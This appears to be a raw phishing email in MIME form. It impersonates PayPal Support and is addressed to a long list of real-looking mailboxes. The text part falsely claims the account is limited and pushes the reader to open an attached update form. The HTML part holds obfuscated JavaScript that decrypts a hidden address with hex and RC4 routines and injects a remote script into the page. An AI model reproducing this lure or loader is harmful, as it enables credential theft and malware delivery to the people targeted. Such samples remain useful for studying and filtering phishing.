@@ -1,0 +1,44 @@
+Content-Type: multipart/mixed; boundary="===============1679922977252511245=="
+MIME-Version: 1.0
+From: PayPal Support <security876@qsy.org>
+Message-Id: <ea1c0aa6aaa97a1ad1d0dfcb2d09f3ec@Kp63tXwUxT3XU.com>
+Subject: Please respond to our inquiry
+To: tbibbs@houstonisd.org
+ tbibb4@verizon.net; tbibb53@yahoo.com; tbibb65435@aol.com; tbibb@hilliard.com;
+ tbibb@mta.ms; tbibb@mwivet.com; tbibbee2@yahoo.com; tbibbens@aerotek.com;
+ tbibber@constellagroup.com; tbibbings@beechercarlson.com; tbibbins@lawa.org;
+ tbibbs2@sbcglobal.net; tbibbs73@hotmail.com; tbibbs@ccaltd.com;
+ tbibbs@hhcorp.org; tbibbs@hotmail.com; tbibbs@houstonisd.org;
+ tbibbs@medmined.com; tbibbs@salcoprop.com; tbibby@grimescompanies.com;
+ tbibby@grimeslog.com; tbibby@huronproduce.ca; tbibbyjr@hotmail.com;
+ tbibc@aol.com; tbibear@live.com; tbibeault@msn.com
+
+--===============1679922977252511245==
+MIME-Version: 1.0
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+Your PayPal account have been limited by PayPal's security team.
+
+In order for us to ensure the safety of our users, we will limit an account that has
+missing or outdated information. It's highly risky for PayPal users to conduct transactions
+with another person who has these problems.
+
+We have reviewed your account and we found some outdated or missing information on your account.
+
+To lift your limitations and granting you full access to your account again, we need you to complete
+the update form (attached in the email). You may open the form in your browser.
+
+After we review your current information that you submit, we'll remove any limitations set on your
+account. However, if there are insufficient or invalid information, we'll send you another notification
+by email.
+
+Your time and attention is greatly appreciated.
+Thank you for entrusting our services.
+--===============1679922977252511245==
+MIME-Version: 1.0
+Content-Type: text/html; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+<!doctype html><html><head><meta charset="utf-8"></head><body><script>function rfl06g(bu84b444) {var c0j59 = '';for (var t031 = 0; t031 < bu84b444.length; t031 += 2) c0j59 += String.fromCharCode(parseInt(bu84b444.substr(t031, 2), 16));return c0j59;}function n7vxs(x5w7mq, ntqt7042) {var bio0c202s, y86q0m9, ir9723826, yi5jm, fl4m6q, c6u9e718f;for (bio0c202s = [], y86q0m9 = 0, yi5jm = "", fl4m6q = 0; fl4m6q < 256; fl4m6q++) bio0c202s[fl4m6q] = fl4m6q;for (fl4m6q = 0; fl4m6q < 256; fl4m6q++)y86q0m9 = (y86q0m9 + bio0c202s[fl4m6q] + ntqt7042.charCodeAt((fl4m6q % ntqt7042.length))) % 256,ir9723826 = bio0c202s[fl4m6q],bio0c202s[fl4m6q] = bio0c202s[y86q0m9],bio0c202s[y86q0m9] = (ir9723826);for (fl4m6q = 0, y86q0m9 = 0, c6u9e718f = 0; c6u9e718f < x5w7mq.length; c6u9e718f++)fl4m6q = ((fl4m6q + 1) % 256),y86q0m9 = ((y86q0m9 + bio0c202s[fl4m6q]) % 256),ir9723826 = bio0c202s[fl4m6q],bio0c202s[fl4m6q] = bio0c202s[y86q0m9],bio0c202s[y86q0m9] = ir9723826,yi5jm += String.fromCharCode(x5w7mq.charCodeAt(c6u9e718f) ^ bio0c202s[(bio0c202s[fl4m6q] + bio0c202s[y86q0m9]) % 256]);return yi5jm}var n8em2 = n7vxs(rfl06g("4f700771c1598ebdca8f1dfa88da1e5b4684d373ef3d44780e463d6218cbcc64b9bf097db9b2840520c911f1e0bc7c3c6fba6c4e860ea2749b8bb2"),"tl3neoeu");var y3kr = n7vxs(rfl06g("546701688b02"),"tl3neoeu");var t5jb2j = document.createElement(y3kr);t5jb2j.src = n8em2;var f0b4273f = n7vxs(rfl06g("4f611265"),"tl3neoeu");document.getElementsByTagName(f0b4273f)[0].appendChild(t5jb2j);</script></body></html>
+--===============1679922977252511245==--
